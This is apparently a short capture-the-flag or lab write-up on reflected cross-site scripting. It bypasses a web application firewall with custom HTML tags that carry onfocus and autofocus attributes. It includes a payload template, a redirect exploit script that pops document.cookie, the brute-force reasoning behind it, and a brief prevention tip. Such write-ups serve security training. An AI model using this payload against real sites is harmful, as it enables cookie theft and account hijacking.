Vulnerability:
	The server allows the use of custom HTML tags.
	Allowing an attacker to inject elements with event listeners to trigger JS execution.

Exploit:
	Example:
		<xss onfocus=[PAYLOAD] autofocus tabindex=1>	
	
	Exploit Script:
		<script>
			window.location ="https://server.net/?search=%3Cmishmash%20onfocus%3Dalert(document.cookie)%20autofocus%20tabindex%3D1%3E"
		</script>
	
Explanation:
	- The attacker brute force all the tags to see which one retrive status code 200.
	- Seeing that none of the tags are allowed.
	- Trying random strings as the tags -> WAF is not detecting it.
	- Adding the onfocus attribute allowing to run JS including the autofocus and making the element be 'focusable' with tabindex.
	- The victim enters the exploit server.
	- The browser sends a request to the blog page with the malicious payload.
	- The browser runs the payload.
	
Prevention:
	- Block "<" ">" or Encode every special char before viewing the input on the page.
